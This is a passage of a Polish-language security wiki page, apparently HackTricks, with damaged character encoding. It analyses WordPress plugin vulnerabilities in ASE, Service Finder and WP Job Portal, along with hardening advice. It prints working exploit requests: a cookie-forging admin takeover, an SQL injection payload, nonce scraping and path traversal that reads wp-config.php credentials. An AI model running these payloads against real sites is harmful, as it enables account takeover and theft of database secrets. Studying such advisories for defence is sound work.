Wiele wtyczek implementuje funkcjÄ™ "view as role" lub tymczasowÄ… zmianÄ™ roli poprzez zapisanie oryginalnej(-ych) roli(-i) w user meta, aby moÅ¼na je byÅ‚o przywrÃ³ciÄ‡ pÃ³Åºniej. JeÅ›li Å›cieÅ¼ka przywracania opiera siÄ™ wyÅ‚Ä…cznie na parametrach Å¼Ä…dania (np. `$_REQUEST['reset-for']`) i na liÅ›cie utrzymywanej przez wtyczkÄ™, bez sprawdzenia capabilities i waÅ¼nego nonce, staje siÄ™ to vertical privilege escalation.

PrzykÅ‚ad z rzeczywistego Å›wiata znaleziono we wtyczce Admin and Site Enhancements (ASE) (â‰¤ 7.6.2.1). W gaÅ‚Ä™zi resetu przywracano role na podstawie `reset-for=<username>` jeÅ›li nazwa uÅ¼ytkownika pojawiaÅ‚a siÄ™ w wewnÄ™trznej tablicy `$options['viewing_admin_as_role_are']`, ale nie wykonano sprawdzenia `current_user_can()` ani weryfikacji nonce przed usuniÄ™ciem obecnych rÃ³l i ponownym dodaniem zapisanych rÃ³l z user meta `_asenha_view_admin_as_original_roles`:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
Dlaczego to jest podatne

- Ufa `$_REQUEST['reset-for']` i opcji wtyczki bez autoryzacji po stronie serwera.
- JeÅ›li uÅ¼ytkownik wczeÅ›niej miaÅ‚ wyÅ¼sze uprawnienia zapisane w `_asenha_view_admin_as_original_roles` i zostaÅ‚ zdegradowany, moÅ¼e je przywrÃ³ciÄ‡, wywoÅ‚ujÄ…c Å›cieÅ¼kÄ™ resetu.
- W niektÃ³rych wdroÅ¼eniach dowolny uwierzytelniony uÅ¼ytkownik mÃ³gÅ‚ wywoÅ‚aÄ‡ reset dla innej nazwy uÅ¼ytkownika nadal obecnej w `viewing_admin_as_role_are` (zÅ‚amana autoryzacja).

Wymagania wstÄ™pne ataku

- WraÅ¼liwa wersja wtyczki z wÅ‚Ä…czonÄ… funkcjÄ….
- Konto docelowe ma przeterminowanÄ… rolÄ™ o wysokich uprawnieniach zapisanÄ… w user meta z wczeÅ›niejszego uÅ¼ycia.
- Dowolna uwierzytelniona sesja; brak nonce/capability w Å›cieÅ¼ce resetu.

Eksploatacja (przykÅ‚ad)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
W podatnych wersjach usuwa to aktualne role i ponownie dodaje zapisane oryginalne role (np. `administrator`), skutecznie eskalujÄ…c uprawnienia.

Detection checklist

- Szukaj funkcji przeÅ‚Ä…czania rÃ³l, ktÃ³re zachowujÄ… â€oryginalne roleâ€ w meta uÅ¼ytkownika (np. `_asenha_view_admin_as_original_roles`).
- Zidentyfikuj Å›cieÅ¼ki resetowania/przywracania, ktÃ³re:
- OdczytujÄ… nazwy uÅ¼ytkownikÃ³w z `$_REQUEST` / `$_GET` / `$_POST`.
- ModyfikujÄ… role za pomocÄ… `add_role()` / `remove_role()` bez uÅ¼ycia `current_user_can()` i `wp_verify_nonce()` / `check_admin_referer()`.
- AutoryzujÄ… na podstawie tablicy opcji wtyczki (np. `viewing_admin_as_role_are`) zamiast na podstawie uprawnieÅ„ wykonawcy.

Hardening

- Wymagaj sprawdzeÅ„ uprawnieÅ„ w kaÅ¼dym fragmencie kodu zmieniajÄ…cym stan (np. `current_user_can('manage_options')` lub surowsze).
- Wymagaj nonce'Ã³w dla wszystkich zmian rÃ³l/uprawnieÅ„ i weryfikuj je: `check_admin_referer()` / `wp_verify_nonce()`.
- Nigdy nie ufaj nazwom uÅ¼ytkownikÃ³w dostarczonym w Å¼Ä…daniu; rozstrzygaj docelowego uÅ¼ytkownika po stronie serwera na podstawie uwierzytelnionego wykonawcy i jawnej polityki.
- UniewaÅ¼niaj stan â€oryginalnych rÃ³lâ€ przy aktualizacjach profilu/rol, aby uniknÄ…Ä‡ przywrÃ³cenia przestarzaÅ‚ych wysokich uprawnieÅ„:
```php
add_action( 'profile_update', function( $user_id ) {
delete_user_meta( $user_id, '_asenha_view_admin_as_original_roles' );
}, 10, 1 );
```
- RozwaÅ¼ przechowywanie minimalnego stanu i uÅ¼ycie tokenÃ³w ograniczonych czasowo, zabezpieczonych capability, do tymczasowych zmian rÃ³l.

---

### Eskalacja uprawnieÅ„ bez uwierzytelnienia przez przeÅ‚Ä…czanie uÅ¼ytkownika zaufane przez cookie na publicznym init (Service Finder â€œsf-bookingâ€)

NiektÃ³re wtyczki podÅ‚Ä…czajÄ… funkcje pomocnicze do przeÅ‚Ä…czania uÅ¼ytkownikÃ³w do publicznego haka `init` i wyznaczajÄ… toÅ¼samoÅ›Ä‡ na podstawie cookie kontrolowanego przez klienta. JeÅ›li kod wywoÅ‚uje `wp_set_auth_cookie()` bez weryfikacji uwierzytelnienia, capability i waÅ¼nego nonce, kaÅ¼dy niezalogowany odwiedzajÄ…cy moÅ¼e wymusiÄ‡ zalogowanie jako dowolny uÅ¼ytkownik o okreÅ›lonym ID.

Typowy podatny wzorzec (uproszczony z Service Finder Bookings â‰¤ 6.1):
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // ğŸ”¥ sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
Dlaczego jest to eksploatowalne

- Publiczny hook `init` powoduje, Å¼e handler jest dostÄ™pny dla niezalogowanych uÅ¼ytkownikÃ³w (brak zabezpieczenia `is_user_logged_in()`).
- ToÅ¼samoÅ›Ä‡ jest wyprowadzana z cookie modyfikowalnego po stronie klienta (`original_user_id`).
- BezpoÅ›rednie wywoÅ‚anie `wp_set_auth_cookie($uid)` loguje Å¼Ä…dajÄ…cego jako tego uÅ¼ytkownika bez Å¼adnych sprawdzeÅ„ capability/nonce.

Eksploatacja (bez uwierzytelnienia)
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### Uwagi dotyczÄ…ce WAF dla CVE WordPress/pluginÃ³w

OgÃ³lne WAFy brzegowe/serwerowe sÄ… dostrojone pod kÄ…tem szerokich wzorcÃ³w (SQLi, XSS, LFI). Wiele bÅ‚Ä™dÃ³w o duÅ¼ym wpÅ‚ywie w WordPressie/wtyczkach to bÅ‚Ä™dy logiki/autoryzacji specyficzne dla aplikacji, ktÃ³re wyglÄ…dajÄ… jak nieszkodliwy ruch, chyba Å¼e silnik rozumie trasy WordPressa i semantykÄ™ wtyczek.

Uwagi ofensywne

- Celuj w punkty koÅ„cowe specyficzne dla wtyczek za pomocÄ… czystych payloadÃ³w: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, niestandardowe handlery plikÃ³w, shortcodes.
- Najpierw testuj Å›cieÅ¼ki bez autoryzacji (AJAX `nopriv`, REST z pobÅ‚aÅ¼liwym `permission_callback`, publiczne shortcodes). DomyÅ›lne payloady czÄ™sto dziaÅ‚ajÄ… bez obfuskacji.
- Typowe przypadki o duÅ¼ym wpÅ‚ywie: eskalacja uprawnieÅ„ (naruszona kontrola dostÄ™pu), dowolne przesyÅ‚anie/pobieranie plikÃ³w, LFI, open redirect.

Uwagi defensywne

- Nie polegaj na ogÃ³lnych sygnaturach WAF, aby chroniÄ‡ CVE wtyczek. WdrÃ³Å¼ virtual patches na warstwie aplikacji specyficzne dla danej podatnoÅ›ci lub zaktualizuj szybko.
- Preferuj pozytywne mechanizmy bezpieczeÅ„stwa w kodzie (capabilities, nonces, rygorystyczna walidacja wejÅ›cia) zamiast negatywnych filtrÃ³w regex.

## Ochrona WordPress

### Regularne aktualizacje

Upewnij siÄ™, Å¼e WordPress, wtyczki i motywy sÄ… aktualne. PotwierdÅº takÅ¼e, Å¼e automatyczne aktualizacje sÄ… wÅ‚Ä…czone w wp-config.php:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
Ponadto, **instaluj tylko zaufane wtyczki i motywy WordPress**.

### Wtyczki bezpieczeÅ„stwa

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **Inne zalecenia**

- UsuÅ„ domyÅ›lnego uÅ¼ytkownika **admin**
- UÅ¼ywaj **silnych haseÅ‚** i **2FA**
- Okresowo **przeglÄ…daj** **uprawnienia** uÅ¼ytkownikÃ³w
- **Ogranicz liczbÄ™ prÃ³b logowania** aby zapobiec atakom Brute Force
- ZmieÅ„ nazwÄ™ pliku **`wp-admin.php`** i zezwalaj na dostÄ™p tylko wewnÄ™trznie lub z okreÅ›lonych adresÃ³w IP.


### Nieuwierzytelniony SQL Injection via insufficient validation (WP Job Portal <= 2.3.2)

Wtyczka rekrutacyjna WP Job Portal udostÄ™pniaÅ‚a zadanie **savecategory**, ktÃ³re ostatecznie wykonuje nastÄ™pujÄ…cy podatny kod w `modules/category/model.php::validateFormData()`:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat âœ—
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Problemy wprowadzone przez ten fragment:

1. **Unsanitised user input** â€“ `parentid` pochodzi bezpoÅ›rednio z Å¼Ä…dania HTTP.
2. **String concatenation inside the WHERE clause** â€“ brak `is_numeric()` / `esc_sql()` / prepared statement.
3. **Unauthenticated reachability** â€“ chociaÅ¼ akcja jest wykonywana przez `admin-post.php`, jedyna kontrola to **CSRF nonce** (`wp_verify_nonce()`), ktÃ³ry kaÅ¼dy odwiedzajÄ…cy moÅ¼e pobraÄ‡ ze strony publicznej osadzajÄ…cej shortcode `[wpjobportal_my_resumes]`.

#### Exploitation

1. Pobierz Å›wieÅ¼y nonce:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. Wstrzyknij dowolne SQL wykorzystujÄ…c `parentid`:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
OdpowiedÅº ujawnia wynik wstrzykniÄ™tego zapytania lub modyfikuje bazÄ™ danych, co potwierdza SQLi.


### Unauthenticated Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

Kolejne zadanie, **downloadcustomfile**, pozwalaÅ‚o odwiedzajÄ…cym pobraÄ‡ **dowolny plik na dysku** poprzez path traversal. WraÅ¼liwy punkt znajduje siÄ™ w `modules/customfield/model.php::downloadCustomUploadedFile()`:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` jest kontrolowany przez atakujÄ…cego i konkatenowany **bez sanitacji**.  Ponownie, jedynÄ… przeszkodÄ… jest **CSRF nonce**, ktÃ³ry moÅ¼na pobraÄ‡ ze strony z CV.

#### Exploitation
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
Serwer zwraca zawartoÅ›Ä‡ `wp-config.php`, leaking DB credentials and auth keys.

## Å¹rÃ³dÅ‚a

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset â€“ delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments â‰¤ 5.6.1 â€“ Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation â€“ Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)

{{#include ../../banners/hacktricks-training.md}}
